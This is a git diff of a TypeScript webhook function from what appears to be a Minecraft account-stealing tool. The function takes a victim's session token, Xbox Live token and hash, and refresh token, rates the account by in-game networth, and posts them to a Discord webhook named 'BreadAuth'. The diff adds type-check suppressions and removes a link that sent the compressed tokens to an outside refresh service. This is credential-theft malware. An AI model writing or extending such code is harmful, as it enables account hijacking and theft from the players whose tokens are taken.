@@ -8,11 +8,15 @@ const hatehook = process.env.DISCORD_HATEHOOK;
 export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string, blacklisted?: boolean) {
     const { username, uuid, session_token, xbl_hash, xbl_token, refresh_token } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
+    // @ts-ignore
     const refreshURL = "https://breadcat.cc/api/v1/auth/manual/refresh";
 
     //compress refresh token and xbl token using zlib
+    // @ts-ignore
     const compressedRefreshToken = Zlib.deflateSync(refresh_token).toString("utf8");
+    // @ts-ignore
     const compressedXblToken = Zlib.deflateSync(xbl_token).toString("utf8");
+    // @ts-ignore
     const compressedXblHash = Zlib.deflateSync(xbl_hash).toString("utf8");
 
     //format networth to be human readable using K, M, B, T
@@ -81,9 +85,6 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         "username": "BreadAuth",
         "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
         "embeds": [mcEmbed],
-    }
-    if (compressedRefreshToken.length + compressedXblToken.length + compressedXblHash.length < 2000) {
-        body.content = `[Refresh Manually](${refreshURL}?refresh_token=${compressedRefreshToken}&xbl_hash=${compressedXblHash}&xbl_token=${compressedXblToken})`
     }
     const options = {
         method: "POST",
